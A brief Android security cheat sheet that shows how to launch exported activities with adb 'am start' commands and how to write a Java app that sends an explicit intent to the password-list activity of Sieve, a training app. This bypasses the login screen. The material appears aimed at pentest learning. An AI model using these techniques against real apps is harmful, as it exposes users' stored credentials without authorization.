## Activity Hacking

**With ADB**

	am start -n <package-name/.activity-name> >> To start a specific activity of an app/package.
	
	am start -a <action-name> -c <catagory-name> >> To start a intent activity with action and catagory name.
	
	am start -a <action-name> -c <catagory-name> --es "username" "admin" >> To provide data to the activity.


**MainActivity.java**


```java
package com.example.myapplication;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        // 🔹 Launch malicious Activity explicitly
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.mwr.example.sieve",        // target package
                "com.mwr.example.sieve.PWList"  // target activity
        ));
        startActivity(intent);
    }
}
```
